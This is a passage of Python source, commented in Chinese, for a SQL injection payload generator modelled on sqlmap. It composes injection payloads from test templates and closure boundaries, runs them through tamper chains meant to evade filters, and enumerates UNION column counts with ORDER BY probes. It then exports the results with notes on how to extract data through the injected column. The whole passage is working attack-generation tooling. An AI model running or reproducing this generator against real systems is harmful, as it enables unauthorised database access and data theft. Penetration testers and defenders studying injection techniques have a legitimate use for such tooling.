    boundaries = CLOSURES if closure == CLOSURE_AUTO else \
        tuple(b for b in CLOSURES if b.key == closure)

    items: list[PayloadItem] = []
    seen: set[str] = set()

    def emit(item: PayloadItem) -> None:
        """去重 + 限额收集。"""
        if item.payload in seen:
            return
        seen.add(item.payload)
        items.append(item)

    def vector_text(vector: str, subs: dict[str, str]) -> str:
        """向量同样过 tamper 链前先替换占位符（tamper 只作用最终 payload）。"""
        return cleanup_payload(vector, subs) if vector else ""

    # -- 1) test × boundary 组合（sqlmap checkSqlInjection 的生成侧） --------
    for test in TESTS:
        if test.technique not in selected:
            continue
        if test.technique == TECH_UNION:
            continue  # UNION 动态生成，见下
        if dbms and test.dbms and test.dbms != dbms:
            continue
        if test.level > max_level:
            continue
        if where_mode not in test.wheres:
            continue
        comment = resolve_comment(test, dbms)
        for boundary in boundaries:
            subs = build_substitutions(
                [test.payload, test.comparison, test.vector],
                orig_value=orig_value, sleep_time=sleep_time,
                query=query, dbms=dbms or test.dbms, rng=rng)
            composed = compose(boundary, test.payload, comment,
                               where_mode, orig_value, rng)
            final = apply_tampers(
                cleanup_payload(composed, subs), tamper_keys, rng)
            note = test.note
            if test.comparison:
                cmp_composed = compose(boundary, test.comparison, comment,
                                       where_mode, orig_value, rng)
                cmp_final = apply_tampers(
                    cleanup_payload(cmp_composed, subs), tamper_keys, rng)
                note = (note + "；" if note else "") + \
                    f"false 对照：{cmp_final}"
            emit(PayloadItem(
                technique=test.technique, title=test.title,
                dbms=test.dbms, level=test.level, risk=test.risk,
                closure=boundary.key, closure_label=boundary.label,
                payload=final,
                vector=vector_text(test.vector, subs),
                note=note,
            ))

    # -- 2) UNION：ORDER BY 探测 + UNION ALL SELECT 列数枚举 -----------------
    if TECH_UNION in selected:
        comment = DBMS_COMMENTS.get(dbms or DBMS_MYSQL, "#")
        if dbms == DBMS_MYSQL and comment.startswith("--"):
            comment = "#"
        for boundary in boundaries:
            subs = build_substitutions(
                [boundary.prefix, boundary.suffix],
                orig_value=orig_value, sleep_time=sleep_time,
                query=query, dbms=dbms, rng=rng)
            if union_order_by:
                for n in range(1, max(union_col_stop, 1) + 1):
                    body = f"ORDER BY {n}"
                    composed = compose(boundary, body, comment,
                                       where_mode, orig_value, rng)
                    emit(PayloadItem(
                        technique=TECH_UNION,
                        title=f"ORDER BY 列数探测（{n} 列）",
                        dbms=dbms, level=1, risk=1,
                        closure=boundary.key, closure_label=boundary.label,
                        payload=apply_tampers(
                            cleanup_payload(composed, subs),
                            tamper_keys, rng),
                        note="最后一个不报错的 n 即列数",
                    ))
            for n in range(union_col_start, union_col_stop + 1):
                body = forge_union_body(n, union_fill, dbms, rng)
                composed = compose(boundary, body, comment,
                                   where_mode, orig_value, rng)
                vector = cleanup_payload(
                    "UNION ALL SELECT [QUERY]" +
                    UNION_DUMMY_TABLE.get(dbms, ""), subs)
                emit(PayloadItem(
                    technique=TECH_UNION,
                    title=f"UNION 查询（{n} 列 / {union_fill}）",
                    dbms=dbms, level=1, risk=1,
                    closure=boundary.key, closure_label=boundary.label,
                    payload=apply_tampers(
                        cleanup_payload(composed, subs), tamper_keys, rng),
                    vector=vector,
                    note="把注入列换成 [QUERY] 的内容取数",
                ))

    if limit and len(items) > limit:
        items = items[:limit]

    counts: dict[str, int] = {}
    for item in items:
        counts[item.technique_label] = counts.get(item.technique_label, 0) + 1
    return GenerateReport(items=items, counts=counts, tamper_keys=tamper_keys)


def format_items_text(items, report: GenerateReport | None = None) -> str:
    """把生成结果排成可导出的文本（# 注释行 + payload / vector）。"""
    lines: list[str] = []
    if report is not None and report.counts:
        summary = "、".join(f"{k} {v} 条"
                            for k, v in report.counts.items())
        lines.append(f"# 共 {report.total} 条（{summary}）")
        if report.tamper_keys:
            lines.append(f"# tamper 链：{' -> '.join(report.tamper_keys)}")
        lines.append("")
    for item in items:
        dbms_label = item.dbms or "通用"
        lines.append(
            f"# [{item.technique_label}][{dbms_label}] {item.title} "
            f"(level {item.level} / risk {item.risk} / {item.closure_label})")
        lines.append(item.payload)
        if item.vector:
            lines.append(f"# 利用向量：{item.vector}")
        if item.note:
            lines.append(f"# 说明：{item.note}")
        lines.append("")
    return "\n".join(lines).rstrip() + "\n"
